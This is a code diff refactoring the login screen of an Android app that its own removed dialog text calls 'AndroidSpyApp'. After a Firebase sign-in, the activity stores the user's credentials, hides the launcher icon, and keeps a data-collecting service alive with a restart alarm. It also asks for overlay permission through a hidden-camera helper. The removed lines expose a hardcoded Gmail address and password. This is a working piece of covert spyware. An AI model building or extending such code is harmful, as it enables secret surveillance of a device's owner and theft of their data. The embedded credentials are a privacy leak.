@@ -8,7 +8,6 @@ import android.os.Bundle
 import android.os.SystemClock
 import android.text.Editable
 import android.text.TextWatcher
-import android.util.Log
 import android.view.View
 import android.widget.Toast
 import androidx.appcompat.app.AlertDialog
@@ -19,6 +18,8 @@ import kotlinx.android.synthetic.main.activity_main.*
 
 
 class MainActivity : AppCompatActivity() {
+    private val VALIDATE_EMAIL_REGEX_PATERN = "[a-zA-Z0-9._-]+@[a-z]+.[a-z]+"
+
     companion object {
         const val PREFS_SERVICE_NEXT_ALARM: String = "SHARED_PREFERENCE_LAST_ALARM_TIME"
         const val SHARED_PREFERENCE_TAG: String = "SHARED_PREFERENCE_NAME"
@@ -39,91 +40,91 @@ class MainActivity : AppCompatActivity() {
         val isFirstRun = prefs.getBoolean(PREFS_IS_FIRST_LAUNCH, true)
 
         if (isFirstRun) {
+            var isEmailValid = false
+            var isPasswordValid = false
             val editor = prefs.edit()
+
             editor.putBoolean(PREFS_IS_FIRST_LAUNCH, false)
             editor.apply()
 
             if (!HiddenCameraUtils.canOverDrawOtherApps(this)) {
-                //Open settings to grant permission for "Draw other apps".
                 HiddenCameraUtils.openDrawOverPermissionSetting(this);
             }
 
-            Log.d("KK: MAIN: ", "main activity onCreate  ")
-
-            var isEmailValid = false
-            var isPasswordValid = false
             et_email.addTextChangedListener(object : TextWatcher {
                 override fun afterTextChanged(s: Editable?) {
+                    onEmailChange(s)
+                }
+
+                override fun beforeTextChanged(s: CharSequence?, start: Int, count: Int, after: Int) { /* no action */ }
+
+                override fun onTextChanged(s: CharSequence?, start: Int, before: Int, count: Int) { /* no action */ }
+
+                private fun onEmailChange(s: Editable?) {
                     isEmailValid = validateEmail(s.toString())
                     btn_connect.isEnabled = isEmailValid && isPasswordValid
                 }
-
-                override fun beforeTextChanged(
-                    s: CharSequence?,
-                    start: Int,
-                    count: Int,
-                    after: Int
-                ) {
-                }
-
-                override fun onTextChanged(s: CharSequence?, start: Int, before: Int, count: Int) {}
             })
             et_password.addTextChangedListener(object : TextWatcher {
                 override fun afterTextChanged(s: Editable?) {
+                    onPasswordChange(s)
+                }
+
+                override fun beforeTextChanged(s: CharSequence?, start: Int, count: Int, after: Int) { /* no action */ }
+
+                override fun onTextChanged(s: CharSequence?, start: Int, before: Int, count: Int) { /* no action */ }
+
+                private fun onPasswordChange(s: Editable?) {
                     isPasswordValid = !s.toString().isBlank()
                     btn_connect.isEnabled = isEmailValid && isPasswordValid
                 }
-
-                override fun beforeTextChanged(
-                    s: CharSequence?,
-                    start: Int,
-                    count: Int,
-                    after: Int
-                ) {
-                }
-
-                override fun onTextChanged(s: CharSequence?, start: Int, before: Int, count: Int) {}
             })
 
             btn_connect.setOnClickListener {
                 if (btn_connect.isEnabled) {
-                    val email = "wapnszkola@gmail.com"/*et_email.text.toString()*/
-                    val password = "qweasd"/*et_password.text.toString()*/
-                    setButtonVisibility(false)
-                    auth.signInWithEmailAndPassword(email, password)
-                        .addOnCompleteListener(this) { task ->
-                            if (task.isSuccessful) {
-                                // Sign in success, update UI with the signed-in user's information
-                                Log.d("KK: ", "signInWithEmail:success")
-                                saveUserCredential(prefs, email, password)
-                                hideAppIcon()
-
-                                val dialog = AlertDialog.Builder(this)
-                                    .setTitle("Attention!")
-                                    .setMessage("The visual interface of app will be close now, and not visible in the future. The AndroidSpyApp will start collecting data about user device and sending data to the server.")
-                                    .setPositiveButton("OK") { dialog: DialogInterface?, _: Int ->
-                                        run {
-                                            Log.d("KK:", "dialog_OK clicked. Finish activity!")
-                                            dialog?.dismiss()
-                                            this.finish()
-                                        }
-                                    }
-                                setButtonVisibility(true)
-                                dialog.show()
-                            } else {
-                                setButtonVisibility(true)
-                                // If sign in fails, display a message to the user.
-
-                                Log.w("KK: ", "signInWithEmail:failure", task.exception)
-                                Toast.makeText(
-                                    baseContext, "Authentication failed.",
-                                    Toast.LENGTH_SHORT
-                                ).show()
-                            }
-                        }
+                    onConnect(auth, prefs)
                 }
             }
         }
+    }
+
+    private fun onConnect(auth: FirebaseAuth, prefs: SharedPreferences) {
+        val email = et_email.text.toString()
+        val password = et_password.text.toString()
+        setButtonVisibility(false)
+        onAuth(auth, email, password, prefs)
+    }
+
+    private fun onAuth(auth: FirebaseAuth, email: String, password: String, prefs: SharedPreferences) {
+        auth.signInWithEmailAndPassword(email, password)
+            .addOnCompleteListener(this) { task ->
+                if (task.isSuccessful) {
+                    saveUserCredential(prefs, email, password)
+                    hideAppIcon()
+
+                    val dialog = AlertDialog.Builder(this)
+                        .setTitle(getString(R.string.dialog_title_attention))
+                        .setMessage(getString(R.string.dialog_description))
+                        .setPositiveButton(getString(R.string.dialog_accept)) { dialog: DialogInterface?, _: Int ->
+                            run {
+                                dialog?.dismiss()
+                                this.finish()
+                            }
+                        }
+                    setButtonVisibility(true)
+                    dialog.show()
+                } else {
+                    setButtonVisibility(true)
+                    toastAutenticationFailed()
+                }
+            }
+    }
+
+    private fun toastAutenticationFailed() {
+        Toast.makeText(
+            baseContext, getString(R.string.autentication_failed_toast_message),
+            Toast.LENGTH_SHORT
+        ).show()
     }
 
     private fun saveUserCredential(prefs: SharedPreferences, email: String, password: String) {
@@ -136,7 +137,6 @@ class MainActivity : AppCompatActivity() {
     private fun hideAppIcon() {
         val p = packageManager
         val componentName = ComponentName(this, MainActivity::class.java)
-        // activity which is first time open in manifiest file which is declare as <category android:name="android.intent.category.LAUNCHER" />
         p.setComponentEnabledSetting(
             componentName,
             PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
@@ -158,7 +158,7 @@ class MainActivity : AppCompatActivity() {
 
         val pendingIntent = PendingIntent.getBroadcast(
             applicationContext,
-            1,
+            MainService.REQUEST_CODE_FOR_ALARM_MANAGER,
             restartService,
             PendingIntent.FLAG_ONE_SHOT
         )
@@ -168,10 +168,9 @@ class MainActivity : AppCompatActivity() {
             AlarmManager.ELAPSED_REALTIME,
             SystemClock.elapsedRealtime() + 60 * 1000, pendingIntent
         )
-        Log.d("KK:", "onDestroy main activity!")
     }
 
     fun validateEmail(input: String): Boolean {
-        return input.matches(Regex("[a-zA-Z0-9._-]+@[a-z]+.[a-z]+"))
+        return input.matches(Regex(VALIDATE_EMAIL_REGEX_PATERN))
     }
 }
